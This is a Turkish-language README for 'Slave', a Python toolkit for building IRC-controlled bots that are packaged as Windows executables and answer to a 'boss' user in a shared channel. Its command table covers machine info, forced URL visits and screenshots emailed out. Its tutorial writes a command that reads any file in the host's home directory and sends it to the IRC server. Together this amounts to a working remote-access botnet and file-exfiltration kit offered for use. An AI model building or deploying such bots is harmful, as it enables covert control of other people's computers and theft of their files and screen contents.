# SLAVE

Slave, Python ile yazılmış özelleştirilebilir bot oluşturmaya yarayan bir yazılımdır. [IRC](https://tr.wikipedia.org/wiki/Internet_Relay_Chat) protokolü üzerinden, yazılan botlar ile haberleşir.

## Yükleme
### Pip ile kurulum
```bash
$ pip install slave-irc
```
### Local kurulum
```bash
$ git clone https://github.com/bufgix/slave
$ cd slave
$ python setup.py install
```

Slave, gerek executable dosya oluşturmada gerekse bağımlıklıları kurmada `pipenv` i kullanır. `pipenv` hakkında daha fazla bilgiye [buradan](https://realpython.com/pipenv-guide/) ulaşabilirsiniz.


## Kullanım
### Basit bot oluşturma
```python
# basic_bot.py

from slave.lib.bot import BotV2


config = {
    'host': 'chat.freenode.net',
    'port': 6667,
    'channel': "#slavebotpool666",
    'boss_name': 'boss666',
    'bot_prefix': "SLAVEBOT"
}
BotV2.read_config_from_dict(config)
BotV2.start()
```

`config` şunları içermelidir
| Key | Value |
|---|---|
| `host` | IRC server (varsayılan `chat.freenode.net`) |
| `port` |  IRC server portu (varsayılan `6667`)|
| `channel`| Bağlanılacak kanal ismi. (varsayılan `#slavebotpool666`)|
| `boss_name` | Botları yönetecek kullanıcın ismi (varsayılan `boss666`) |
| `bot_prefix`| Bot ön eki (varsayılan `SLAVEBOT`) |

## Çalıştırılabilir dosya oluşturma
---
Slave, direkt olarak çalıştırabilir dosya oluşturmanıza olanak sağlar. Bunu yaparlen [PyInstaller](https://www.pyinstaller.org) kullanır.

Yukarıda yazdığımız botu çalıştırılabilir dosya yapmak için:
```bash
$ python slave basic_bot.py
[i] Source: C:\Users\user\your_bot\basic_bot.py
[i] Creating executable file...
[*] Created executable file. Check C:\Users\user\path\your_bot\dist
```

Oluşan `dist/` dizinini altında `basic_bot.exe` dosyası artık kullanıma hazır.

`basic_bot.exe` yi çalıştırdıktan sonra 5-10 saniye içinde `config` de belirlediğiniz şekilde IRC'ye bağlanır.

Buradan sonra `config` de belirlediğiniz `bos_name` ile aynı olarak IRC server ve channel'e girin. Ardından botlarınıza emir vermeye başlayabilirsiniz.

## Nasıl komut vereceksiniz
Slave botlarına emir vermek için `$` ön eki getirilir.
```
$info bfr24s
```   
```
$visit bfr24s https://google.com
```

gibi. Komuttan sonraki ilk parametre genelde vereceğiniz botun idsini alır. Eğer bütün botlara bu komutu vermek istiyorsanız `bot_id` yerine `/all` yazabilirsiniz. 

```
$visit /all https://google.com
```

`BOtV2` nin sağladığı komutlar ve kullanımları aşağıdaki gibidir
| Command |  Desc | Syntax  |
|---|---|---|
| quit  | Kill bot  | `$quit [/all | <bot_id>]`  |
|  info |  Information of bot machine  | `$info [/all | <bot_id>]`  |
| message | Message show with tkinter  |  `$message [/all | <bot_id>] <message> <msec>` |
| visit  | Open url with webbroser  | `$visit [/all | <bot_id>] <url>` |
| screenshot  | Take sceenshot and send your email(Only Gmail)  | `$screenshot [/all | <bot_id>] <email> <password>`|
| help | Help text of command  |  `$help <bot_id> <cmd>` |



Botlarınızı her yerden yönetebilirsiniz
* Web: [Kiwi](https://kiwiirc.com/nextclient/)
* Android: [AndroidIRC](https://play.google.com/store/apps/details?id=com.androirc&hl=tr)
* IOS: [Mutter](https://apps.apple.com/tr/app/mutter-irc-client/id1059224189?l=tr)


## Nasıl kendi komutlarımı yazarım ?
Slave, kendi özel botunuzu yazmanızı sağlar. Bunu yapmak için `Bot` sınıfının `@register` decelerator'unu kullanmanız gerekir.

Şimdi kendimiz bir komut yazalım. Yazacağımız komut argüman olarak verdiğimiz dosya ismini okuyup içindekileri servera göndersin. Komutun söz dizimi şöyle olsun.
```
$read [/all | <bot_id>] <file_name>
```

```python
# bot_custom.py

from slave.lib.bots import BotBasic

config = {
    'host': 'chat.freenode.net',
    'port': 6667,
    'channel': "#slavebotpool666",
    'boss_name': 'boss666',
    'bot_prefix': "SLAVEBOT"
}
BotBasic.read_config_from_dict(config)
BotBasic.bot_type = "MyCustomBot"

@BotBasic.register('read', all=True, on_connect=False, help_text="Read from file $read [/all | <bot_id>] <file_name>")
def read_file(bot, args):
    pass

BotBasic.start()
```

Görüldügü gibi `register()` ilk paramtere olarak komut dizisini alır. `all=` keywordu, `<bot_id>` yerine `/all` kullanmamızı ve bütün botlarda aynı anda komutumuzun çalıştırılmasını sağlar. `on_connect=` Bu, eğer True ise yazdığınız komut servera bağlandığı anda çalışır. `help_text=` ise komutumuzun imzasıdır. Burada komutun nasıl kullanılacağı hakkında bilgi verebilirsiniz.

Komut fonksyonu iki parametre almak zorundadır. Birinci parametre olarak `Bot` objesi alır. Bu server ile bot arasında iletişimi sağlar.

```bot.send_text(text: str) -> None```

Servera text mesajı göndermeyi sağlar.

`bot.exit_server() -> None`

Botun serverdan ayrılmasını sağlar

`bot.send_command_help() -> None`

Var olan komutları ve bilgilerini servera gönderir.

İkinci argüman olan args ise argüman listesini alır.

![img](https://i.resimyukle.xyz/Vfy4BS.png)

şimdi komutumuzu yazmaya devam edelim
```python
from pathlib import Path

...

@BotBasic.register('read', all=True, on_connect=False, help_text="Read from file $read [/all | <bot_id>] <file_name>")
def read_file(bot, args):
    path = str(Path(f"~/{args[1]}").expanduser())
    with open(path, 'r') as f:
        bot.send_text(f.read())

...

```

Her şey hazır. Şimdi test etmek için `bot_custom.py` yi çalıştırabiliriz.
```bash
$ python bot_custom.py
```
`file.txt`
```
Im secret
Don't read me
```

![img](https://i.resimyukle.xyz/ybHK7z.png)

Tabi dosyayı okumdadan önce var olup olmadığını kontrol etmek önemlidir. Eğer var olmayan bir dosyaya erişmeye çalışırsanız bot, serverla haberleşmeyi kesecektir.


Yukardaki örnekte daha az komut olduğunu görmüşsünüzdür. Bunun nedeni `BotBasic` sınıfının `BotV2` ye göre daha az komut içermesi. Hem kendi komutlarınızı hem de `BotV2` deki standart komutları birleştirmek için
```python
from slave.lib.bots import BotBasic, BotV2

...

BotBasic.use_other_bot_commands(BotV2)
BotBasic.start()
```
![img](https://i.resimyukle.xyz/05VUGy.png)

Botunuzun hazır olduğunu düşünüyorsanız artık [çalıştırılabilir dosya](#çalıştırılabilir-dosya-oluşturma) yapabilirsiniz.


## LICENSE: [MIT](https://github.com/bufgix/slave/blob/master/LICENSE)


